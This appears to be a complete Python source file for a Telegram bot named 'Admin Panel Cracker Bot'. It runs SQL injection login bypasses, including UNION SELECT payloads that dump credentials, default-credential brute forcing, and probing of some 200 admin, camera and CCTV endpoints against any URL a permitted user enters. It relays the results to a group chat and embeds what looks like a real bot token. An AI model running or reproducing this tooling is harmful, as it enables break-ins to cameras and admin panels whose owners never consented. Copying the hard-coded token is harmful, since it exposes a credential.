import os
import json
import asyncio
import re
import logging
import threading
from typing import Tuple
from urllib.parse import urljoin
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from aiohttp import ClientSession, ClientTimeout
from aiohttp.web import Application as WebApp, Response, run_app

# Setup logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# Environment variables
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN", "8020708306:AAHmrEb8nkmBMzEEx_m88Nenyz5QgrQ85hA")
ADMIN_ID = os.getenv("ADMIN_ID", "6972264549")
PORT = int(os.getenv("PORT", 8080))
GROUP_CHAT_ID = os.getenv("GROUP_CHAT_ID", "")

# Initialize users.json
if not os.path.exists("users.json"):
    try:
        with open("users.json", "w") as f:
            json.dump({"authorized_users": [ADMIN_ID]}, f)
    except Exception as e:
        logger.error(f"Failed to create users.json: {e}")

# Sensitive endpoints (200+)
DIRECT_PATHS = [
    "/dashboard", "/admin", "/login", "/live", "/config", "/settings", "/webcam", "/ipcam", "/stream", "/control",
    "/status", "/panel", "/home", "/index", "/main", "/setup", "/manage", "/system", "/user", "/profile",
    "/camera", "/video", "/snapshot", "/mjpeg", "/rtsp", "/playback", "/record", "/monitor", "/view", "/access",
    "/security", "/network", "/device", "/info", "/overview", "/logs", "/events", "/alerts", "/diagnostics", "/tools",
    "/admin/login", "/admin/dashboard", "/admin/config", "/admin/settings", "/admin/status", "/admin/control",
    "/login.php", "/admin.php", "/dashboard.php", "/config.php", "/settings.php", "/status.php", "/control.php",
    "/webcam/login", "/ipcam/login", "/camera/login", "/stream/login", "/live/login", "/video/login",
    "/admin/index", "/admin/main", "/admin/home", "/admin/panel", "/admin/setup", "/admin/manage",
    "/system/login", "/system/dashboard", "/system/config", "/system/settings", "/system/status",
    "/user/login", "/user/dashboard", "/user/settings", "/user/profile", "/user/control",
    "/manage/login", "/manage/dashboard", "/manage/config", "/manage/settings", "/manage/status",
    "/setup/login", "/setup/dashboard", "/setup/config", "/setup/settings", "/setup/status",
    "/control/login", "/control/dashboard", "/control/config", "/control/settings", "/control/status",
    "/panel/login", "/panel/dashboard", "/panel/config", "/panel/settings", "/panel/status",
    "/home/login", "/home/dashboard", "/home/config", "/home/settings", "/home/status",
    "/main/login", "/main/dashboard", "/main/config", "/main/settings", "/main/status",
    "/index/login", "/index/dashboard", "/index/config", "/index/settings", "/index/status",
    "/webcam/dashboard", "/ipcam/dashboard", "/camera/dashboard", "/stream/dashboard", "/live/dashboard",
    "/webcam/config", "/ipcam/config", "/camera/config", "/stream/config", "/live/config",
    "/webcam/settings", "/ipcam/settings", "/camera/settings", "/stream/settings", "/live/settings",
    "/webcam/status", "/ipcam/status", "/camera/status", "/stream/status", "/live/status",
    "/video/dashboard", "/video/config", "/video/settings", "/video/status",
    "/snapshot/dashboard", "/snapshot/config", "/snapshot/settings", "/snapshot/status",
    "/mjpeg/dashboard", "/mjpeg/config", "/mjpeg/settings", "/mjpeg/status",
    "/rtsp/dashboard", "/rtsp/config", "/rtsp/settings", "/rtsp/status",
    "/playback/dashboard", "/playback/config", "/playback/settings", "/playback/status",
    "/record/dashboard", "/record/config", "/record/settings", "/record/status",
    "/monitor/dashboard", "/monitor/config", "/monitor/settings", "/monitor/status",
    "/view/dashboard", "/view/config", "/view/settings", "/view/status",
    "/access/dashboard", "/access/config", "/access/settings", "/access/status",
    "/security/dashboard", "/security/config", "/security/settings", "/security/status",
    "/network/dashboard", "/network/config", "/network/settings", "/network/status",
    "/device/dashboard", "/device/config", "/device/settings", "/device/status",
    "/info/dashboard", "/info/config", "/info/settings", "/info/status",
    "/overview/dashboard", "/overview/config", "/overview/settings", "/overview/status",
    "/logs/dashboard", "/logs/config", "/logs/settings", "/logs/status",
    "/events/dashboard", "/events/config", "/events/settings", "/events/status",
    "/alerts/dashboard", "/alerts/config", "/alerts/settings", "/alerts/status",
    "/diagnostics/dashboard", "/diagnostics/config", "/diagnostics/settings", "/diagnostics/status",
    "/tools/dashboard", "/tools/config", "/tools/settings", "/tools/status",
    "/admin/system", "/admin/network", "/admin/security", "/admin/device", "/admin/logs",
    "/system/admin", "/system/network", "/system/security", "/system/device", "/system/logs",
    "/login/admin", "/login/dashboard", "/login/config", "/login/settings", "/login/status",
    "/cctv", "/cctv/login", "/cctv/dashboard", "/cctv/config", "/cctv/settings", "/cctv/status",
    "/ipcamera", "/ipcamera/login", "/ipcamera/dashboard", "/ipcamera/config", "/ipcamera/settings"
]

# Credentials for brute force
USERNAMES = ["admin", "root", "user", "guest", "administrator"]
PASSWORDS = [
    "admin", "12345", "", "password", "123456", "admin123", "666666", "4321", "1111",
    "1234", "adminadmin", "root", "toor", "pass", "test", "qwerty", "letmein"
]

# SQL injection payloads (high-level, 50+)
SQL_PAYLOADS = [
    "' OR '1'='1", "admin' --", "admin' #", "' OR ''='", "admin' OR '1'='1",
    "' OR 1=1--", "' OR 'a'='a", "') OR ('1'='1", "' OR 1=1#", "admin' OR 1=1--",
    "1' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #", "admin' OR 'a'='a",
    "' OR '1'='1'/*", "admin'/*", "admin'*/", "' OR 1=1/*", "admin' OR 1=1/*",
    "') OR '1'='1", "' OR '1'='1' OR ''='", "admin' OR ''='", "' OR 1=1 LIMIT 1--",
    "' OR '1'='1' UNION SELECT NULL, NULL--", "' OR '1'='1' UNION SELECT 1, 2--",
    "' UNION SELECT username, password FROM users--",
    "' UNION SELECT 1, concat(username, ':', password) FROM users--",
    "' UNION SELECT 1, version()--", "' UNION SELECT 1, user()--",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
    "' OR (SELECT COUNT(*) FROM users) > 0--", "' OR 1=1 ORDER BY 1--",
    "' OR 1=1 UNION SELECT NULL, NULL, NULL--", "' OR 1=1 LIMIT 1 OFFSET 0--",
    "admin' AND 1=0 UNION SELECT username, password FROM users--",
    "' OR '1'='1' AND SLEEP(1)--", "' OR IF(1=1,1,0)--", "' OR 1=1 INTO OUTFILE '/tmp/test'--",
    "' OR 1=1 UNION SELECT 1, database()--", "' OR 1=1 UNION SELECT 1, table_name FROM information_schema.tables--",
    "' OR 1=1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'--",
    "admin' OR 1=1 UNION SELECT 1, group_concat(username) FROM users--",
    "' OR 1=1 UNION SELECT 1, @@version--", "' OR 1=1 UNION SELECT 1, current_user()--",
    "' OR 1=1 AND (SELECT 1 FROM dual)--", "' OR 1=1 AND (SELECT 1 FROM users LIMIT 1)--",
    "admin' OR 1=1 AND (SELECT password FROM users WHERE username='admin')--",
    "' OR 1=1 AND (SELECT username FROM users WHERE 1=1)--"
]

async def check_access(user_id: str) -> bool:
    if user_id == ADMIN_ID:
        return True
    try:
        with open("users.json", "r") as f:
            data = json.load(f)
            return user_id in data["authorized_users"]
    except Exception as e:
        logger.error(f"Error checking access: {e}")
        return False

async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if user_id != ADMIN_ID:
        await update.message.reply_text("Only admin can use this command.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /add <user_id>")
        return
    new_user = context.args[0]
    try:
        with open("users.json", "r+") as f:
            data = json.load(f)
            if new_user not in data["authorized_users"]:
                data["authorized_users"].append(new_user)
                f.seek(0)
                f.truncate()
                json.dump(data, f, indent=2)
                await update.message.reply_text(f"User {new_user} added.")
            else:
                await update.message.reply_text(f"User {new_user} already authorized.")
    except Exception as e:
        logger.error(f"Error adding user: {e}")
        await update.message.reply_text(f"Error: {str(e)}")

async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if user_id != ADMIN_ID:
        await update.message.reply_text("Only admin can use this command.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /remove <user_id>")
        return
    remove_user = context.args[0]
    try:
        with open("users.json", "r+") as f:
            data = json.load(f)
            if remove_user in data["authorized_users"]:
                data["authorized_users"].remove(remove_user)
                f.seek(0)
                f.truncate()
                json.dump(data, f, indent=2)
                await update.message.reply_text(f"User {remove_user} removed.")
            else:
                await update.message.reply_text(f"User {remove_user} not found.")
    except Exception as e:
        logger.error(f"Error removing user: {e}")
        await update.message.reply_text(f"Error: {str(e)}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    user_id = str(update.effective_user.id)
    if not await check_access(user_id):
        await update.message.reply_text("Contact Admin for access - @Imvasupareek")
        return
    keyboard = [
        [
            InlineKeyboardButton("🔐 SQL Injection", callback_data="sql_injection"),
            InlineKeyboardButton("🔑 Brute Force", callback_data="brute_force")
        ],
        [
            InlineKeyboardButton("🌐 Direct Check", callback_data="direct_check"),
            InlineKeyboardButton("ℹ️ Help", callback_data="help")
        ]
    ]
    await update.message.reply_text(
        "🌐 Admin Panel Cracker Bot\n"
        "⚠️ Use only on authorized systems!\n"
        "Choose an option:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if not await check_access(user_id):
        await update.message.reply_text("Contact Admin for access - @Imvasupareek")
        return
    await update.message.reply_text(
        "📖 Help\n"
        "/start - Start the bot\n"
        "/bypass - SQL injection bypass\n"
        "/brute - Brute force credentials\n"
        "/direct - Check direct endpoints\n"
        "/add <user_id> - Add user (admin only)\n"
        "/remove <user_id> - Remove user (admin only)\n"
        "⚠️ Ethical use only!"
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if not await check_access(user_id):
        await update.message.reply_text("Contact Admin for access - @Imvasupareek")
        return
    context.user_data.clear()
    await update.message.reply_text("Operation cancelled.")

async def get_form_fields(url: str, session: ClientSession) -> Tuple[str, str]:
    try:
        async with session.get(url, ssl=False) as response:
            html = await response.text()
            form_match = re.search(r'<form.*?>(.*?)</form>', html, re.DOTALL | re.IGNORECASE)
            if form_match:
                inputs = re.findall(r'<input.*?name=["\'](.*?)["\'].*?>', form_match.group(1), re.IGNORECASE)
                username_field = next((i for i in inputs if i.lower() in ["username", "user", "login"]), "username")
                password_field = next((i for i in inputs if i.lower() in ["password", "pass"]), "password")
                return username_field, password_field
    except Exception as e:
        logger.error(f"Error parsing form: {e}")
    return "username", "password"

async def check_success(response, html: str) -> bool:
    try:
        if response.status == 200:
            if not re.search(r'login|sign in|invalid|error', html, re.IGNORECASE):
                return True
            if re.search(r'dashboard|welcome|control panel|admin', html, re.IGNORECASE):
                return True
            if response.url.path in ["/dashboard", "/admin", "/home", "/panel"]:
                return True
    except Exception as e:
        logger.error(f"Error checking success: {e}")
    return False

async def sql_injection(url: str, session: ClientSession, update: Update) -> list:
    results = []
    username_field, password_field = await get_form_fields(url, session)
    total_payloads = len(SQL_PAYLOADS)
    for i, payload in enumerate(SQL_PAYLOADS, 1):
        try:
            data = {username_field: payload, password_field: "test"}
            async with session.post(url, data=data, ssl=False, timeout=3) as response:
                html = await response.text()
                if await check_success(response, html):
                    results.append(f"✅ Bypassed! Payload: {payload}\n[🌐 Visit {response.url}]")
                    break
                if re.search(r'username:.*?, password:.*?', html, re.IGNORECASE):
                    results.append(f"✅ Credentials Found: {html[:100]}")
                await asyncio.sleep(0.3)  # Stricter rate limiting
            if i % 5 == 0:
                await update.message.reply_text(f"Progress: {i}/{total_payloads} payloads")
        except Exception as e:
            logger.error(f"SQL injection error: {e}")
            continue
    return results or ["❌ No bypass found."]

async def brute_force(url: str, session: ClientSession, update: Update) -> list:
    results = []
    username_field, password_field = await get_form_fields(url, session)
    total_combinations = len(USERNAMES) * len(PASSWORDS)
    count = 0
    for username in USERNAMES:
        for password in PASSWORDS:
            count += 1
            try:
                data = {username_field: username, password_field: password}
                async with session.post(url, data=data, ssl=False, timeout=3) as response:
                    html = await response.text()
                    if await check_success(response, html):
                        results.append(f"✅ Cracked! Username: {username}, Password: {password}\n[🌐 Visit {response.url}]")
                        return results
                    await asyncio.sleep(0.3)
                if count % 5 == 0:
                    await update.message.reply_text(f"Progress: {count}/{total_combinations} combinations")
            except Exception as e:
                logger.error(f"Brute force error: {e}")
                continue
    return results or ["❌ No credentials found."]

async def direct_check(base_url: str, session: ClientSession, update: Update) -> list:
    results = []
    total_paths = len(DIRECT_PATHS)
    for i, path in enumerate(DIRECT_PATHS, 1):
        try:
            full_url = urljoin(base_url, path)
            async with session.get(full_url, ssl=False, timeout=3) as response:
                html = await response.text()
                if response.status == 200 and not re.search(r'<form.*?(login|username|password).*?>', html, re.IGNORECASE):
                    if re.search(r'dashboard|admin|control panel|settings', html, re.IGNORECASE):
                        results.append(f"✅ Accessible without login: {full_url}\n[🌐 Visit {full_url}]")
                await asyncio.sleep(0.3)
            if i % 5 == 0:
                await update.message.reply_text(f"Progress: {i}/{total_paths} paths")
        except Exception as e:
            logger.error(f"Direct check error: {e}")
            continue
    return results or ["❌ No open endpoints found."]

async def handle_option(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = str(update.effective_user.id)
    if not await check_access(user_id):
        await query.message.reply_text("Contact Admin for access - @Imvasupareek")
        return
    context.user_data["mode"] = query.data
    await query.message.reply_text(f"Enter URL (e.g., http://192.168.1.1:80{'/login' if query.data != 'direct_check' else ''}):")

async def handle_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if not await check_access(user_id):
        await update.message.reply_text("Contact Admin for access - @Imvasupareek")
        return
    mode = context.user_data.get("mode")
    if not mode:
        await update.message.reply_text("Please select an option first using /start.")
        return
    url = update.message.text.strip()
    if not url.startswith(("http://", "https://")):
        await update.message.reply_text("Invalid URL. Please include http:// or https://")
        return
    await update.message.reply_text(f"⚠️ Starting {mode.replace('_', ' ')} on {url}...\nUse only on authorized systems!")
    async with ClientSession(timeout=ClientTimeout(total=3)) as session:
        try:
            if mode == "sql_injection":
                results = await sql_injection(url, session, update)
            elif mode == "brute_force":
                results = await brute_force(url, session, update)
            else:  # direct_check
                results = await direct_check(url, session, update)
            result_text = "\n".join(results)
            await update.message.reply_text(f"📊 Results:\n{result_text}")
            if GROUP_CHAT_ID:
                await context.bot.send_message(GROUP_CHAT_ID, f"📊 {mode.replace('_', ' ')} Results for {url}:\n{result_text}")
        except Exception as e:
            logger.error(f"Error in {mode}: {e}")
            await update.message.reply_text(f"Error: {str(e)}")

async def health_check(_):
    logger.info("Health check called")
    return Response(text="OK")

def run_health_server():
    logger.info("Starting health check server")
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    web_app = WebApp()
    web_app.router.add_get("/health", health_check)
    try:
        run_app(web_app, port=PORT, loop=loop)
    except Exception as e:
        logger.error(f"Health server error: {e}")

def main():
    # Start health check server in a separate thread
    health_thread = threading.Thread(target=run_health_server, daemon=True)
    health_thread.start()
    logger.info("Health check server thread started")

    # Start Telegram bot
    try:
        app = Application.builder().token(TELEGRAM_TOKEN).build()
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("help", help_command))
        app.add_handler(CommandHandler("add", add_user))
        app.add_handler(CommandHandler("remove", remove_user))
        app.add_handler(CommandHandler("cancel", cancel))
        app.add_handler(CallbackQueryHandler(handle_option, pattern="^(sql_injection|brute_force|direct_check|help)$"))
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_url))
        logger.info("Starting Telegram bot")
        app.run_polling()
    except Exception as e:
        logger.error(f"Bot error: {e}")

if __name__ == "__main__":
    main()
